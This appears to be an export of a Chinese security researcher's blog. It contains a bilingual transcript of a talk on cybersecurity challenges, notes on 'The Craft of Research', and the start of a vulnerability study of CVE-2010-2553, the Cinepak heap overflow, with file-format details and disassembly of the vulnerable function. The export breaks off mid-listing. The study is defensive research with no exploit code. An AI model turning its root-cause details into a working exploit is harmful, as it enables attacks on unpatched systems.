层再到应用层。同时，当计算机彼此通信时，它们将使用加密通道这一非常强大的隔离原语。\n\nThe second direction I want to talk about is to develop memory safe programming languages. We know today many of our systems software are developed by memory unsafe languages such as C and C++. Unfortunately, programmers when using such languages can easily introduce buffer overflow vulnerabilities which allow attackers to control critical data structures such as the return addresses in the stack which can further lead to attacks such as control flow hijacking.\n\n我想谈的第二个方向是开发内存安全编程语言。我们知道今天许多系统软件是使用诸如 C 和 C++ 这样的内存不安全的语言开发的。不幸的是，程序员们在使用这样的语言时很容易引入缓冲区溢出漏洞。这允许攻击方控制关键数据结构，例如栈中的返回地址，进而导致控制流劫持之类的攻击。\n\nIn fact, there is a heated arm race between buffer attacks and defenses. Let me dive into deeper off this arm race to see clearly how offenders and defenders play the security game. The first few buffer flow attacks use code injection in which attackers directly overflow the buffer instead with injected shell and execute them in the stack. To defeat code injection attacks, defenders then proposed canary and Data Execution Prevention namely DEP. Attackers then proposed ret2libc attack in which attackers could reuse by reusing the address in the standard library to create the shellcode instead of directly inject them. In response to this attack, defenders then proposed address space layout randomization namely ASLR. Later, in 2005 there was another code reuse attack called borrowed code chunk attack and in the same year there is a new defense called control flow integrity or CFI to defeat attack that violates the intended program control flow. Then in 2007, the very famous ROP attack was proposed followed by Q-ROP in 2011, Then there was the defense in 2012 to randomize the addresses of both standard libraries and main executables. In 2013, There was the JIT ROP and also BinCFI defense. In 2014, there was the BROP and Forward-Edge CFI. In 2015, there was the Microsoft control flow guard from visual studio. In 2016, there was data oriented programming as well as runtime ASLR. In 2017, there was the address oblivious code reuse and the defense of Intel CET and ARM pointer authentication code. Most recently, there were other new attacks and defenses as well.\n\n事实上，缓冲区溢出的攻防之间有着一场激烈的军备竞赛。让我深入探讨这场军备竞赛以看清攻击方与防守方之间是如何进行安全博弈的。最初的一些缓冲区溢出攻击使用代码注入技术，攻击方直接溢出缓冲区并在栈中执行注入的 shellcode。为了避免代码注入攻击，防守方提出了 Canary 与 DEP&#x2F;NX 技术。随后攻击方提出了 ret2libc 攻击，通过复用标准库中的地址创建 shellcode 而非直接注入它们。为了应对这种攻击，防守方提出了内存地址空间随机化技术即 ASLR。2005 年出现了另一种名为借用代码块攻击的代码复用攻击，同年也出现了一种新的防御技术叫做控制流完整性检验或者说 CFI 技术以防止违背预期程序执行流的攻击。随后，非常著名的 ROP 攻击技术在 2007 年被提出，紧跟其后的是 2011 年提出的 Q-ROP。之后的 2012 年出现了同时随机化标准库与主要代码内存地址的防御技术。2013 年则出现了 JIT ROP 攻击与 BinCFI 防御技术。2014 年出现了 BROP 攻击与 Forward-Edge CFI 防御技术。2015 年出现了自 Visual Studio 而来的 Microsoft CFG 防御技术。2016 年 DOP 攻击与运行时 ASLR 防御技术问世。2017 年出现了地址无关代码复用攻击，Intel CET 防御与 ARM PAC 防御技术。以及最近也有着其它新的攻击和防御技术出现。\n\nI have to emphasize that this is by no means our complete list. There are many other attacks and defenses not listed here. But the key point I want to show you here is that this arm race started from early code injection attacks for attackers with ASLR and DEP from defenders and then code reuse attacks such as ROP and JIT-ROP to control for integrity defense which have been implemented in modern hardware such as the pointer authentication code. However, we cannot have this unrest forever. We need memory safe programming languages.\n\n我必须强调，这绝不是我们的完整列表，其中还有许多其它攻击与防御技术未列出。但我想向你展示的关键在于，这场军备竞赛始于早期攻击方的代码注入攻击，防守方的 ASLR 与 DEP，然后是代码复用攻击如 ROP 和 JIT-ROP，再到 PAC 等已在现代硬件中得到实现的控制流完整性防御技术。可是，我们不能永远这样下去，我们需要内存安全的编程语言。\n\nThen let’s look at the history of the programming language development. Over the past seventy years, numerous programming languages have been developed. And this includes early days that assembly language, to c in 1970s, to Java, php and javascript in 1990s, to go in 2009, rust in 2010, Swift in 2014, etc. Among them, I want to particularly highlight rust which is memory safe by design and meanwhile performance. Today, the good news is that rust has become the most loved programming language according to our recent survey from programmers and many Tech companies such as Microsoft and Facebook have started to use rust in their production.\n\n纵观编程语言的历史，七十年来已经有许多语言被开发了出来。这包括早期的汇编语言，到 70 年代的 C， 90 年代的 Java，PHP 和 JavaScript，2009 年的 Go，2010 年的 Rust，2014 年的 Swift 等等。其中我想着重讲讲 Rust，它是一门从语言设计层面兼具内存安全与性能的编程语言。今天，一个好消息是，根据我们最近的调查，Rust 已经成为程序员中最受欢迎的编程语言，许多科技公司如微软和脸书已经开始在生产中使用 Rust。\n\nThe third direction I want to talk about is the formal verification. We know formal methods have been used during the aircraft design which is one of the reasons why airplanes are more resilient to crashes. In the past a few years, we have witnessed a number of news headlines such as hack-proof drones, formal verification in automotive software design and recently formally verified software in real world. These are all good signs.\n\n我想谈的第三个方向是形式化验证。我们知道形式化方法已经在飞机设计中使用且成为了飞机更能抗坠毁的原因之一。在过去几年中，我们已经看到了许多新闻头条例如防黑客无人机，汽车软件设计中的形式化验证以及最近在现实世界中正式验证的软件，这些都是好迹象。\n\nHowever, we also have to be aware that the difficulty of proving software is secure is way more challenging than finding a vulnerability in the software. While I do not work on formal revocation at this moment, I do have seen some advancements in the systems community which is started from 2009 where a micro kernel with less than 10,000 lines of code was formally verified. Then in 2012, an execute-verify architecture was proposed to handle the verification for multi core servers. In 2013 it was the verification of computations with states. 2014, end to end security VIA automated full system verification. 2016, verification of file systems. Suddenly, in 2017 three papers on verification. They focused on either file systems or operating system kernels or enclave software. 2014 four papers on verification. They focus on either information flow controlto concurrent software or computationality of file systems or concurrent services. 2019, 4 papers, 2020, 5 papers. So clearly we see the trend and we can anticipate more formal verifications will be applied in real world computer systems design and implementations.\n\n然而，我们也必须意识到证明软件安全远比发现软件中的漏洞更具挑战性。虽然我目前并不从事形式化验证的研究，但我确实看到了系统社区的一些进展。2009 年，一个少于 10,000 行代码的微内核被正式验证。2012 年，一个执行-验证的架构被提出以用于处理多核服务器的验证，2013 年，出现了带状态的计算验证技术，2014 年通过全自动化系统验证端到端安全技术，2016 年，文件系统的验证。突然，2017 年出现了 3 篇关于形式化验证的论文，它们分别聚焦于文件系统，操作系统内核和隔区软件。2014 年出现了 4 篇关于形式化验证的论文，分别聚焦于信息流控制，并发软件，文件系统的计算行和并发服务。2019 年 4 篇，2020 年 5 篇。所以很明显我们能够看到这一趋势，并预期更多的形式化验证技术将被应用于现实世界的计算机系统设计和实现。\n\nThe last direction I would like to talk about is using AI for cybersecurity. Remember I have talked about machine is really good at brute force, precision and scalability and they never feel tired. So we can absolutely use machines particularly the AI to automate many of our sophisticated tasks such as cyber data analytics, improve the precision of attack detection, predict the risks and respond to attacks instantly. Recently, Ohio state was awarded the 20 million dollars AI-Edge institute from the national science foundation. I’m very fortunate to be one of the faculty members in this institute. The mission of this institute is to design the next generation edge network such as 6G and beyond that are highly efficient, reliable and robust. Clearly, security and privacy are crucial in the edge network, and we will investigate, how AI can help secure the edge network and meanwhile, how to secure the AI itself and protect the user’s privacy. I’m quite excited about having the opportunities to work on these topics.\n\n我想谈的最后一个方向是使用人工智能进行网络安全。记得我谈过机器非常擅长暴力破解，精确性和可扩展性。它们永远不会感到疲劳。因此我们当然能使用机器，特别是人工智能来自动化许多复杂的任务，例如：\n\n网络数据分析\n攻击检测的准确性改良\n风险预测\n即时攻击响应\n\n最近，俄亥俄州立大学获得了国家科学基金会 2000 万美元的人工智能研究所。我很幸运成为这个研究所的教员之一。这个研究所的使命是设计下一代边缘网络例如 6G 以及其它高效，可靠且鲁棒的技术。显然，安全和隐私在这一边缘网络中是至关重要的。我们将调研 AI 如何帮助保护边缘网络且同时保护其自身与用户隐私。我非常兴奋有机会在这些主题上工作。\n\nLet me conclude my talk by briefly talking about the Non technical aspect in cybersecurity. Cybersecurity is complicated. It requires not only the technology development but also the laws to deter their attackers and whothen accountable if they commit any cyber attacks. We can see there are already a number of cyber-secured laws and regulations from earlier CFAA to recently GDPR and CCPA. These laws can certainly make attackers think twice before launching any attacks and meanwhile make the Tech companies invest more in cyber securityOtherwise, they will face huge financial punishment for example by paying the fine with up to billions of dollars, for cyber attacks such as data breaches\n\n让我通过简要谈谈网络安全的非技术方面来总结这次演讲。网络安全很复杂，它不仅需要技术发展，还需要法律来阻止攻击者，并在他们进行任何网络攻击时追究责任。我们可以看到已经有许多网络安全法律和法规，从早期的 CFAA 到最近的 GDPR 和 CCPA。这些法律当然可以让攻击方在发动任何攻击前三思，同时让科技公司更多地投资于网络安全。否则它们将因为数据泄露之类的网络攻击面临巨大的经济处罚，例如支付高达数十亿美元的罚款。\n\nHowever, We have to be aware that there are many other challenges such as attribution, which aim to locate the attackers but for the Internet it is so easy for attackers to hide themselves. And also the jurisdiction challenge where we need the international laws and orders and the enforcement of these laws across the globe. Now I have reached the end of my presentation. Hopefully I have convinced you why cyber security is hard. If you have any questions and comments, please feel free to contact me at this email address. Thank you for watching\n\n然而，我们必须意识到还有许多其它挑战，例如归因————我们需要定位攻击者但在互联网中攻击者很容易隐藏自己，管辖权挑战————我们需要国际法律和秩序并在全球范围内推行这些法律法规。我的演讲到此结束，希望我已经说服了你为什么网络安全如此困难，如果你有任何问题和评论，请随时通过这个电子邮件地址联系我，感谢观看。\nReferenceProf. Zhiqiang Lin’s HomepageCybersecurity DaysRecords on YouTube Channel\n","categories":["Research Note"]},{"title":"《研究的艺术》 Ⅱ","url":"/2024/07/17/Research%20Note/%E7%A0%94%E7%A9%B6%E7%9A%84%E8%89%BA%E6%9C%AF-%E2%85%A1/","content":"第二部分 提问题，找答案当从头开始进行研究计划，但还没有清楚的方向，甚至缺少一个确定的题目时，我们很可能会感到束手无策，除非有一个规划来引导整个研究计划。这样一个规划的最初四个步骤大概是\n\n找到一个题目，而这个题目要具体到能够包含足够多的相关信息。比如说，不是“科学写作的历史”，而是“作为现代科学论文写作先驱的皇家学会会议论文集中的论文(1675-1750)”\n提出与改题目相关的问题，直到发现某些引发自己兴趣的问题\n决定读者会期待看到什么类型的证据。比如它们可以接收二级资料吗？它们会期待量化数据吗或权威性的引文吗？\n决定是否可以找到数据的来源\n\n\n值得注意的是，“科学写作的历史”作为一个对象肯定包含了““作为现代科学论文写作先驱的皇家学会会议论文集中的论文”的历史，这样看来似乎由前者到后者所涵盖的范围变小了。但我们看待题目所包含的信息量多少的方式正是其指代范围的大小。信息越多，这些信息所限制得到的范围就应该越小，指代目标就会更明确\n\n研究者应预期在这个过程中会有大量的书写工作，拟订初步的大纲，质疑你所阅读到的，绘图来连接不同的事实，概述不同的原始资料、立场及学派，甚至记录所想。我们难以预知这些写作中的哪些内容将来会被使用，但边进行研究边写作，能够激发研究者最好的批判思考，让我们能够更加了解自己的原始资料，更有效率的完成文稿\n然而，研究者们将发现自己无法井然有序地依循着上述四个步骤来进行研究。在拥有全部所需的证据之前，我们可能会想出一个暂时的答案或一些用来支持答案的论证。做研究并非在有清楚标志的路径上游历，而更像是在茂密的森林中摸索，迂回地寻找某个在寻得前不知为何物的东西。但是不管路径多么曲折，如果按部就班地进行，并预想着可能碰到的困难，我们就会有信心稳健地迈向自己的答案\nTopics -&gt; Questions如果我们能随意地研究任何感兴趣的题目，由于选项太多而时间太少，这种自由反而可能会让人感到沮丧。我们往往需要在一个领域(subject)中寻找到一个话题(topic)（很难有一个研究真的就是针对整个研究领域来做的），并以这个话题作为途径，在里面问出一些问题，然后回答它，例如在【计算机安全】这个领域，以【Linux 系统内核漏洞发现】作为一个话题，我们能够提出诸如【如何使用动态分析方法高效地发现 Linux 系统内核漏洞】、【 Linux 系统内核哪些部分容易出现栈溢出漏洞】等研究问题。这些话题可大可小，感兴趣的研究者可多可少，总之研究者需要对这个话题有一些问题，并且问题的答案需要是重要的，甚至能够在一定程度上改变研究领域\n大部分研究者都有比兴趣更强的研究动力，但新手通常很难从研究兴趣中将题目缩限到足以进行一个研究计划。但即使如此，没有什么能比全身心投入自己的研究更能提升自己的研究质量。研究兴趣在大多数情况下都会是一个人选择话题的最好来源。此时，当我们从研究兴趣中选取出了那么几个题目，这些题目可能广泛到了可以作为百科全书的副标题。如果一个话题能够被四五个字陈述，那范围肯定太广泛。为了从广泛的到明确的题目，我们往往会利用增加特定的文字和词组来限定主题，这些限制后的主题应该能够表达出某种论点，例如《商用飞机的历史》在修改为《在商用飞机早期阶段，军方对 DC-3 的发展的重要贡献》，其表达的观点就从【商用飞机有一段历史】这样的事实一般的陈述语句变成了【在商用飞机的早期阶段，军方的 DC-3 的发函做出了关键性的贡献】这样一个更像是观点的表述\n《研究的艺术》一书对于从话题到问题这一部提供的方式都比较倾向于文科。而在技术领域中，对于某一个特定的话题，研究者们的研究问题主要就是\n\n针对目前已知而又缺乏有效解决方案的问题，如何提出一个能够解决它的算法\n如何把一个已知的技术做大\n如何提升性价比\n如何把它做安全\n\n当我们问完了所有的问题时，还剩下最后一个更难的问题需要去问———— So What? 哪怕是一位有很多经验的研究者，也会难以进行这一部，除非研究计划已经进行了很长一段时间。研究者一旦有了能够吸引自己兴趣的问题，就必须提出一个更困难的问题，为什么这个问题能吸引读者？为什么这个问题值得提出？这些问题甚至需要被提得更苛刻一些，因为人们总是习惯去为自己辩护。事实上，资深的研究者通常会从其它人已经问过，但尚未被彻底回答或者被未被正确回答的问题展开研究。但即使如此，通过反复这样对自己的研究进行评估，哪怕我们还不能很好地回答它，也能帮助我们理解自己已经进行到何处，以及还有哪些工作有待完成\nQuestions -&gt; Problem日常的研究通常不是从空想一个题目开始，而是从解决一个碰巧遇到的实际难题(practical problem)开始，而这个难题如果未解决则意味着麻烦。当解决方案尚未明确时，我们会先提出一些问题，希望这些问题的答案有助于解决原先的难题。然而，为了回答这些问题，我们又必须提出一个其他形式的难题并加以解决，这个问题即所谓的研究难题(research problem)。实际难题和研究难题有相同的基本结构，它包括两个组成部分:\n\n一个处境或情境 (situation or condition)\n该情景会导致让人不悦的后果(undesirable consequences)，而这样的损失(costs)是人们所不想承担的\n\n要提出一个实际难题，你得同时说明它的两个组成部分:\n\n它的情境\n臭氧层的破洞正逐渐扩大\n\n\n该情况导致的损失令人们不悦\n许多人会死于皮肤癌\n\n\n\n值得注意的是，读者会根据这个难题对于他们自己的（而不是对于我们）造成的损失来判断其重要性，所以我们必须试着从读者的观点来构思解决的难题。想象一下提出难题时，读者的回应都是 “So What”，例如：\n\n(情境)臭氧层的破洞在去年扩大了\nSo What\n\n\n(损失)臭氧层中的破洞变大意味着会有更多的紫外线侵袭地球\nSo What\n\n\n过多的紫外线会导致人类罹患皮肤癌\n\n如果读者的回复依然是 “So What”，那我们就无法说服他相信这既是我们的难题也是他的难题。只有当读者不再说 “So What”，而是说 “Oh No! What shall we do?” 时，一个难题才会存在。像癌症之类的实际难题，由于具有显而易见的后果，所以很容易掌握。然而在学术领域里，比较可能处理的是研究难题，因为其情况和损失通常比较抽象，所以比较难以掌握\n\n如果这个难题的损失确实是显而易见的，而读者依然表示 “So What” 甚至 “I don’t care”。那可能是因为读者不是我们的受众(wrong audience)。建议改投其它期刊\n\n《研究的艺术》关于搜集资料的内容放到如今的信息时代来看几乎是基础技能，在此不再叙述\nReferenceThe Craft of Research Fourth Edition跟李沐学 AI\n","categories":["Research Note"]},{"title":"《研究的艺术》 Ⅰ","url":"/2024/07/11/Research%20Note/%E7%A0%94%E7%A9%B6%E7%9A%84%E8%89%BA%E6%9C%AF-%E2%85%A0/","content":"《研究的艺术》概要对于研究新手而言，没有任何工作可以像学习做研究一样，能够帮助一个人真正理解收集到的资料或文献。只有亲身经历过研究的不确定性以及凌乱的过程，才能让一个人彻底且深思熟虑地评价所读的文章或资料。撰写自己的研究论文将会帮助自己了解在教科书上读到和专家告知大众的内容背后的工作。研究让人直接体验新知识是如何依靠问什么问题和不问什么问题而产生，呈现研究的标准格式如何形成研究者所提的问题与所提供的答案\n小心地研究和清楚地报告都是辛苦的工作，每当研究者对一个新的研究团体谈论他的研究，都必须学习这个团体的工作方式，如此一来才能把注意力集中在对这个团体成员而言重要的事物上。尽管如此，仍存在着一些所有团体都遵循的共同规则。这就是《研究的艺术》一书所要介绍的。这些规则不仅现在有帮助，即使几年以后，当研究环境改变或研究任务的要求更苛刻时，它们仍然有效。\n《研究的艺术》的第一部分讨论当研究者初次执行研究计划时，必须特别仔细考虑的事项，为什么读者会期待研究者用某些特别的方式撰写报告，研究者为什么不可以把自己的研究计划设想成独自进行的工作，而是与参考文献的作者及未来的读者之间的对话\n第二部分讨论如何形成兵发展研究计划，《研究的艺术》将阐明：\n\n如何从一个兴趣找出题目（topic），然后如何专注于这个题目并提出问题\n如何把那些问题转换成研究难题\n如何寻找原始资料来引导自己找到答案\n如何使用这些原始资料，并对发现的观点进行彻底的思考\n\n在第三部分，《研究的艺术》讨论如何组成一个严谨的论证来支持研究者的观点，其中包括：\n\n概要一个研究论证所包含的要素\n怎样才称得上具有重要意义的观点\n怎样才称得上是一个有效的理由及有力的证据\n为什么研究者必须以及如何去承认质疑、异议及替代方案，然后作出回应\n研究者如何为自己论证的逻辑辩护\n\n在第四部分，《研究的艺术》列出了产生报告的步骤：\n\n如何规划及撰写初稿\n如何检验与修改它\n如何撰写导论和结论，使读者相信研究者的报告值得他们花时间去阅读\n如何清楚而明确地呈现复杂的量化的证据\n如何修改行文风格，以让它清楚、直接而易读\n\n\n这一部分内容非常值得一读，但在目前的环境下未必全都适用。如何 Tell a story 在不同的领域有着不同的标准，故该部分暂不写博客或会被写在其它专题的博客中\n\n除此以外，在《研究的艺术》后记的 “研究伦理” 部分，其作者思考并讨论了专业能力以外的一些事情，例如研究与协作伦理的重要性\n研究是一项辛苦的工作，就如同任何具有挑战性的工作一样。无论研究者在规划时有多么谨慎，研究都是一条弯曲的路，会有一些无法预期的转折，甚至是兜圈子。一些研究的方法论可以很好地帮助研究者掌握其中的个别环节，进而驾驭整个研究并更有信心地面对更多的研究\n第一部分 研究、研究者与读者\n《研究的艺术》一书将认为研究是Gather information to answer a question that solves a problem\n\n以书面形式进行思考《研究的艺术》在一开始并没有进行任何研究方法的介绍，而是在介绍了研究的概念与重要性后引入了一种思考模式，即以书面形式进行思考。\n写作有助于\n\n记忆研究发现\n了解研究结果\n明晰思考观点\n\n\n写作对于学习的好处可参阅费曼学习法\n\n大多数人都同意写作是学习、思考以及理解的重要部分。但一些人可能会疑惑：为什么我不能以自己喜欢的形式写作而要满足研究团体强加的格式限制？或许，学习用读者期待的方式撰写研究论文最重要的理由，是以他人的标准和价值去检验你的想法，进而让你更理解自己和自己的想法。为他人写作会比为自己写作的要求更严格。当研究者在写作中确定自己的想法之际，由于研究者自己是如此熟悉它们，因此最被需要的帮助不是让自己的这些想法以自己想要的方式被理解，而是让这些想法真实地呈现。这就是传统的格式与规划不只是一个把研究者的研究置入其中的空瓶。这些格式逐步演进，帮助作者从读者期待和理解的角度，更清楚地看待自己的想法。当你明确地试着去预想读者的问题时，你将会更了解自己的作品：如何评价你的证据？为何你认为它们是有关联的？你的观点意味着什么？你曾经考虑过但后来拒绝的想法是什么？你如何回应读者可想见的问题、保留意见和异议？\n传统格式具体呈现了研究团体共有的习惯和价值。一旦懂得标准格式，研究者能够更加理解特定团体可能提出的问题、所关切的对象以及关切的原因。从读者的角度以书面形式思考，回避其他形式的思考更详细、持续且更能调和不同的观点。\n\n一名研究者最好能够在“相信自己计划的价值”和“满足老师和同事的需要”之间取得平衡，而如果你相信自己所做的事情，却找不到人分享你的信念，你所能做的就是带着我们的钦佩，埋头更加努力。\n\n与读者建立联系研究者在编写自己的研究论文时需要明确自己的读者画像。写给专业的读者和写给一般读者的内容必然会因为作者对读者的知识程度做出的评估而呈现出很大的差异。例如如果把以上两种写作内容的读者对调，非专业的读者会难以理解或认为自己的需求没有得到满足，专业同行的读者则会认为作者写作时带有优越感或者不专业。作者赋予读者角色的定位不恰当将失去读者的信任与研读的意愿\n很少有人阅读研究论文只是为了好玩，因此研究者必须知道自己能为读者和自己之间创造出一种什么样的关系。与撰写实验报告，课程作业不同，在研究论文中，你需要把老师和学生的角色对调过来。作为一个研究者，你得把自己变成一个“了解别人需要知道什么”的人，而且把读者视作一群“不知道却需要知道的人”。所以，研究者与读者建立稳定的研究关系的第一步，是提供比他们已经知道的事实更多的东西。《研究的艺术》提供了三种常见的资深研究者与读者建立的关系\n\n研究者发现了对自己而言有趣、新鲜且重要的事物，而读者同样具有这些兴趣\n研究者围绕特定的意图来设计报告，告诉读者怎么做才能解决难题\n研究者回答一些让某个研究团体更了解其领域的特殊旨趣的问题，而读者或许会采用这些答案去解决实际问题\n\n研究者在第一种关系中比较像是挖掘数据后进行汇报的学生，在第二种关系则更贴近于在企业、商业和政府部门提供实际建议给需要者的专家。而在学术界中最常见的是第三种。一位学者常常回答一些让某个研究团体更了解其领域的特殊旨趣的问题，而其他学者或许会采用这些答案去解决实际问题。例如数学家在质数分布上的神奇发现帮助了密码学家设计出无法被破解的密码。研究本身的原始目的往往不在于解决实际问题，而是在于解决一个相关知识尚不完整或人们对它有错误理解的概念性的问题。\nReferenceThe Craft of Research Fourth Edition跟李沐学 AI\n","categories":["Research Note"]},{"title":"CVE-2010-2553 漏洞研究","url":"/2024/09/09/Vulnerability%20Investigation/CVE-2010-2553-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"Microsoft Windows Cinepak 编解码器对媒体文件解压缩时存在代码控制不当,其中(iccvid.dll)的 CVDCompress 函数在解压缩媒体文件时未对 Cinepak(CVID) Stream Format 中的 Number of coded strips(Frame Header) 大小充分检测与限制,导致在复制压缩数据时造成堆溢出,进而导致程序崩溃或任意代码执行(maybe)\n影响范围：Microsoft Windows XP Professional x64 Edition Service Pack 2Microsoft Windows XP Service Pack 3Microsoft Windows Vista Service Pack 1 and Microsoft Windows Vista Service Pack 2Microsoft Windows Vista x64 Edition Service Pack 1 and Microsoft Windows Vista x64 Edition Service Pack 2Microsoft Windows 7 for 32-bit SystemsMicrosoft Windows 7 for x64-based Systems\n\n\nRIFF 文件及其基本数据结构RIFF(Resource Interchange File Format 资源交换文件格式)是一种通用文件容器格式,主要用于存储包括但不限于音频和视频的多媒体数据。RIFF 文件所包含的数据类型由该文件的扩展名来标识,例如：\n\n音频视频交错格式数据(.AVI)\n波形格式数据(.WAV)\n位图格式数据(.RDI)\nMIDI格式数据(.RMI)\n调色板格式数据(.PAL)\n多媒体电影格式数据(.RMN)\n动画光标格式数据(.ANI)\n其它RIFF文件(.BND)\n\nRIFF 文件的基本单元是 Chunk,其数据结构如下\nstruct chunk&#123;    u32 id;    u32 size;    u8 data[size];&#125;\n\nid 为 4 个 ASCII 字符组成 FourCC(Four Character Code) 格式标识符,用以识别块中所包含的数据类型。size 为存储在 data 字段中的数据的长度。data 为 Chunk 内包含的实际内容,以字为单位排列,字节数为奇数时以空字节补齐。当块标识符(id)为 RIFF 或 LIST 时,data 字段可以包含子块,其余块只能包含数据。\nAVI 文件及其基本数据结构AVI(Audio Video Interleaved) 是 Microsoft 于 1992 年 11 月开发的一种符合 RIFF 文件规范的多媒体容器格式,可以在文件容器中同时包含音频和视频数据,并于 2010 年由美国政府的国家档案和记录管理局被定为用于保存数字视频的官方文件格式。基本上,AVI 文件有 3 种类型：\n\nAVI1.0: 原始 AVI 格式,也是最基本的格式。一般情况下其索引地址与大小为 4 字节,最大容量为 4GB\nOpen-DML(AVI2.0): AVI文件格式的扩展。于 1996 年 2 月 28 日由 Matrox OpenDML 开发,受 Microsoft 支持并被非正式地成为 AVI2.0。最重要的改进是：\n对文件大小几乎没有限制\n减少了33%的开销\n\n\nHybride-Files\n\nAVI 文件由 Chunks 和 Lists 两种基本单元组成,与 RIFF 文件的基本单元 Chunk 类似,其数据结构如下：\ntypedef struct &#123;    DWORD dwFourCC;    DWORD dwSize;    BYTE data[dwSize];&#125;CHUNK;typedef struct &#123;    DWORD dwList;    DWORD dwSize;    DWORD dwFourCC;     BYTE data[dwSize-4];&#125;LIST;\n\n其中 dwFourCC 与 dwList 为标识符字段,dwSize 为包含数据的大小,data 为包含的数据。\n\nAVI 文件格式细节参阅 sp4n9x’s Blog AVI文件格式分析\n\nCinepak Stream FormatCinepak 压缩格式的视频流由由 Frame Header 和多个 Strip 组成。Frame Header 的长度为 10 个字节,分别表示\n\nFlags: 位 0 指定每个 Strip 的 codebooks 是否使用上一个 Strip 中定义的 codebooks\nLength of CVID data: Frame 中的字节总数\nWidth of coded frame : Frame 的像素宽度\nHeight of coded frame: Frame 的像素高度\nNumber of coded strips: 用于对 Frame 进行编码的 Strips 总数\n\n本漏洞的成因即为程序 Frame Header 内的 Number of coded strips 未进行任何限制而在复制数据时造成了堆溢出\n\nCinepak 压缩格式细节参阅 Cinepak 压缩格式\n\n漏洞分析使用 Windows Media Player(wmplay.exe) 打开样本 .avi 文件后触发 Access violation 而中断。开启 hpa 和 ust 进行调试,栈回溯查看崩溃函数的主调函数并下断点,发现触发异常的函数位于 iccvid.dll 模块。使用 IDA 打开 iccvid.dll 时可以通过选项下载微软符号表,定位到崩溃函数所在位置\n.text:73B721AE.text:73B721AE                               ; =============== S U B R O U T I N E =======================================.text:73B721AE.text:73B721AE                               ; Attributes: bp-based frame.text:73B721AE.text:73B721AE                               ; int __stdcall CVDecompress(ULONG, _BYTE *, unsigned int, int, int, int, int).text:73B721AE                               _CVDecompress@28 proc near              ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+27↓p.text:73B721AE                                                                       ; Decompress(x,x,x,x,x,x,x,x,x,x,x,x,x,x)+118↓p.text:73B721AE                                                                       ; Decompress(x,x,x,x,x,x,x,x,x,x,x,x,x,x)+140↓p.text:73B721AE.text:73B721AE                               var_20= dword ptr -20h.text:73B721AE                               var_1C= dword ptr -1Ch.text:73B721AE                               var_18= dword ptr -18h.text:73B721AE                               var_14= dword ptr -14h.text:73B721AE                               pulResult= dword ptr -10h.text:73B721AE                               var_C= dword ptr -0Ch.text:73B721AE                               ulMinuend= dword ptr -8.text:73B721AE                               var_4= dword ptr -4.text:73B721AE                               arg_0= dword ptr  8.text:73B721AE                               arg_4= dword ptr  0Ch.text:73B721AE                               arg_8= dword ptr  10h.text:73B721AE                               arg_C= dword ptr  14h.text:73B721AE                               arg_10= dword ptr  18h.text:73B721AE                               arg_14= dword ptr  1Ch.text:73B721AE                               arg_18= dword ptr  20h.text:73B721AE.text:73B721AE 8B FF                         mov     edi, edi.text:73B721B0 55                            push    ebp.text:73B721B1 8B EC                         mov     ebp, esp.text:73B721B3 83 EC 20                      sub     esp, 20h.text:73B721B6 53                            push    ebx.text:73B721B7 8B 5D 08                      mov     ebx, [ebp+arg_0].text:73B721BA 56                            push    esi.text:73B721BB 8B 73 24                      mov     esi, [ebx+24h].text:73B721BE 57                            push    edi.text:73B721BF 33 FF                         xor     edi, edi.text:73B721C1 3B F7                         cmp     esi, edi.text:73B721C3 74 1C                         jz      short loc_73B721E1.text:73B721C3.text:73B721C5 FF 75 20                      push    [ebp+arg_18]                    ; int.text:73B721C8 89 7B 24                      mov     [ebx+24h], edi.text:73B721CB 57                            push    edi                             ; int.text:73B721CC 57                            push    edi                             ; int.text:73B721CD 57                            push    edi                             ; int.text:73B721CE 68 46 24 00 00                push    2446h                           ; int.text:73B721D3 56                            push    esi                             ; int.text:73B721D4 53                            push    ebx                             ; ULONG.text:73B721D5 E8 D4 FF FF FF                call    _CVDecompress@28                ; CVDecompress(x,x,x,x,x,x,x).text:73B721D5.text:73B721DA 56                            push    esi                             ; hMem.text:73B721DB FF 15 40 10 B7 73             call    ds:__imp__LocalFree@4           ; LocalFree(x).text:73B721DB.text:73B721E1.text:73B721E1                               loc_73B721E1:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15↑j.text:73B721E1 33 C0                         xor     eax, eax.text:73B721E3 83 7D 10 20                   cmp     [ebp+arg_8], 20h ; &#x27; &#x27;.text:73B721E7 0F 82 00 02 00 00             jb      loc_73B723ED.text:73B721E7.text:73B721ED 8B 75 0C                      mov     esi, [ebp+arg_4].text:73B721F0 8A 66 01                      mov     ah, [esi+1].text:73B721F3 0F B6 4E 03                   movzx   ecx, byte ptr [esi+3].text:73B721F7 8A 46 02                      mov     al, [esi+2].text:73B721FA C1 E0 08                      shl     eax, 8.text:73B721FD 0B C1                         or      eax, ecx.text:73B721FF 39 45 10                      cmp     [ebp+arg_8], eax.text:73B72202 0F 8C EC 01 00 00             jl      loc_73B723F4.text:73B72202.text:73B72208 8A 0E                         mov     cl, [esi].text:73B7220A 88 4D 13                      mov     byte ptr [ebp+arg_8+3], cl.text:73B7220D 8D 4D F0                      lea     ecx, [ebp+pulResult].text:73B72210 51                            push    ecx                             ; pulResult.text:73B72211 6A 0A                         push    0Ah                             ; ulSubtrahend.text:73B72213 50                            push    eax                             ; ulMinuend.text:73B72214 E8 6D FF FF FF                call    _ULongSub@12                    ; ULongSub(x,x,x).text:73B72214.text:73B72219 85 C0                         test    eax, eax.text:73B7221B 0F 8C D3 01 00 00             jl      loc_73B723F4.text:73B7221B.text:73B72221 33 C0                         xor     eax, eax.text:73B72223 8A 66 08                      mov     ah, [esi+8].text:73B72226 83 C6 0A                      add     esi, 0Ah.text:73B72229 89 7D EC                      mov     [ebp+var_14], edi.text:73B7222C 89 75 E8                      mov     [ebp+var_18], esi.text:73B7222F 89 75 F4                      mov     [ebp+var_C], esi.text:73B72232 8A 46 FF                      mov     al, [esi-1].text:73B72235 3B C7                         cmp     eax, edi.text:73B72237 89 45 E4                      mov     [ebp+var_1C], eax.text:73B7223A 0F 8E AA 01 00 00             jle     loc_73B723EA.text:73B7223A.text:73B72240 89 7D FC                      mov     [ebp+var_4], edi.text:73B72240.text:73B72243.text:73B72243                               loc_73B72243:                           ; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+236↓j.text:73B72243 8B 45 F0                      mov     eax, [ebp+pulResult].text:73B72246 83 F8 16                      cmp     eax, 16h.text:73B72249 0F 82 9B 01 00 00             jb      